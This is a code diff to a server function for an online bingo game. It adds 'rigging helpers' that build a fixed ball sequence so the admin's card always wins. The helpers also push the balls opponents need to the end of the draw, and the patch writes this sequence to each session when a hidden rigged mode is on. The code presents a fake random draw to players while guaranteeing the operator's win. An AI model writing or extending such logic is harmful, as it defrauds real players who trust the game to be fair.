@@ -22,6 +22,75 @@ const INITIAL_DELAY_MS  = 6_000;
 const CALL_INTERVAL_MS  = 5_000;
 const ADMIN_TELEGRAM_ID = 676350518;
 
+// ── Rigging helpers (mirrors start-game/index.ts) ─────────────────────────────
+function shuffle<T>(arr: T[]): T[] {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+function winningLines(card: (number | null)[][]): number[][] {
+  const lines: number[][] = [];
+  for (let r = 0; r < 5; r++)
+    lines.push(card[r].filter((n): n is number => n !== null));
+  for (let c = 0; c < 5; c++)
+    lines.push(card.map((row) => row[c]).filter((n): n is number => n !== null));
+  lines.push(card.map((row, i) => row[i]).filter((n): n is number => n !== null));
+  lines.push(card.map((row, i) => row[4 - i]).filter((n): n is number => n !== null));
+  return lines;
+}
+
+function buildRiggedSequence(adminCartelaId: number, opponentCartelaIds: number[]): number[] {
+  const adminCard  = generateCartela(adminCartelaId);
+  const adminLines = winningLines(adminCard);
+  const chosenLine = adminLines[Math.floor(Math.random() * adminLines.length)];
+  const winBalls   = [...chosenLine];
+  const winSet     = new Set(winBalls);
+
+  const lateSet = new Set<number>();
+  for (const cartelaId of opponentCartelaIds) {
+    const c = generateCartela(cartelaId);
+    for (const line of winningLines(c)) {
+      const blockable = line.filter((b) => !winSet.has(b));
+      if (blockable.length === 0) continue;
+      if (!blockable.some((b) => lateSet.has(b))) {
+        lateSet.add(blockable[blockable.length - 1]);
+      }
+    }
+  }
+
+  const neutral = Array.from({ length: 75 }, (_, i) => i + 1)
+    .filter((b) => !winSet.has(b) && !lateSet.has(b));
+  shuffle(neutral);
+
+  const n      = winBalls.length;
+  const minWin = n === 4 ? 15 : 17;
+  const maxWin = Math.min(n === 4 ? 21 : 23, n - 1 + neutral.length);
+  const winPos = minWin + Math.floor(Math.random() * (maxWin - minWin + 1));
+
+  const winPositions: number[] = [winPos];
+  while (winPositions.length < n) {
+    const p = Math.floor(Math.random() * winPos);
+    if (!winPositions.includes(p)) winPositions.push(p);
+  }
+  winPositions.sort((a, b) => a - b);
+  shuffle(winBalls);
+
+  const early     = new Array<number>(winPos + 1);
+  const winPosSet = new Set(winPositions);
+  let wi = 0, ni = 0;
+  for (let i = 0; i <= winPos; i++) {
+    early[i] = winPosSet.has(i) ? winBalls[wi++] : neutral[ni++];
+  }
+
+  const late = [...Array.from(lateSet), ...neutral.slice(ni)];
+  shuffle(late);
+
+  return [...early, ...late];
+}
+
 Deno.serve(async () => {
   const admin = createClient(SUPABASE_URL, SERVICE_ROLE_KEY, {
     auth: { autoRefreshToken: false, persistSession: false },
@@ -65,7 +134,38 @@ Deno.serve(async () => {
       const lw = (s as Record<string, unknown>).last_watcher_at as string | null;
       if (!lw || Date.now() - new Date(lw).getTime() > 10_000) continue;
     }
-    await admin.rpc("start_game_session", { p_session_id: s.id }).catch(() => {});
+    const { data: started } = await admin.rpc("start_game_session", { p_session_id: s.id }).catch(() => ({ data: null }));
+    if (!started) continue; // already started by another invocation
+
+    // Apply rigged sequence immediately after starting — this is the authoritative
+    // path (game-runner starts 99% of games via timer expiry; start-game edge fn
+    // can't rig because start_game_session returns false once already active).
+    if (riggedMode && adminUserId) {
+      try {
+        const { data: participants } = await admin
+          .from("game_participants")
+          .select("user_id, cartela_1, cartela_2")
+          .eq("game_session_id", s.id)
+          .eq("is_watcher", false);
+
+        const adminPart = participants?.find((p: { user_id: string }) => p.user_id === adminUserId);
+        const adminCartelaId: number | null = adminPart?.cartela_1 ?? adminPart?.cartela_2 ?? null;
+
+        if (adminCartelaId !== null) {
+          const opponents = (participants ?? []).filter((p: { user_id: string }) => p.user_id !== adminUserId);
+          const opponentCartelaIds: number[] = [];
+          for (const opp of opponents) {
+            if (opp.cartela_1 !== null) opponentCartelaIds.push(opp.cartela_1);
+            if (opp.cartela_2 !== null) opponentCartelaIds.push(opp.cartela_2);
+          }
+          const riggedSeq = buildRiggedSequence(adminCartelaId, opponentCartelaIds);
+          await admin
+            .from("game_sessions")
+            .update({ ball_sequence: riggedSeq })
+            .eq("id", s.id);
+        }
+      } catch (_) { /* best-effort — never block the game */ }
+    }
   }
 
   const { data: initialSessions } = await admin
